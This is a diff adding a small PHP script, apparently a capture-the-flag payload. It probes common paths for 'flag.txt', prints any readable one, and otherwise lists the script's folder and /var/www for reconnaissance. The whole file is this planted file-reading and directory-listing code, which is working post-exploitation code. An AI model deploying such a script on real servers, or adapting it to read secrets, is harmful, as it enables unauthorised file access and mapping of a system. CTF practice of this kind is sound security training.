@@ -1,0 +1,35 @@
+<?php
+echo "<pre>";
+
+$paths = [
+    "/flag.txt",
+    "/var/www/flag.txt",
+    "/var/www/html/flag.txt",
+    "/var/www/private/flag.txt",
+    "/home/flag.txt",
+    "/tmp/flag.txt"
+];
+
+foreach ($paths as $p) {
+    echo "[*] Cek: $p\n";
+    if (is_readable($p)) {
+        echo "\n[+] FLAG FOUND DI: $p\n\n";
+        echo htmlspecialchars(file_get_contents($p));
+        exit;
+    }
+}
+
+echo "\n[-] Belum ketemu di path umum.\n";
+echo "[*] Current dir: " . getcwd() . "\n";
+echo "[*] Script dir : " . __DIR__ . "\n\n";
+
+echo "[*] Isi folder script:\n";
+print_r(scandir(__DIR__));
+
+echo "\n[*] Isi /var/www:\n";
+if (is_dir("/var/www")) {
+    print_r(scandir("/var/www"));
+}
+
+echo "</pre>";
+?>
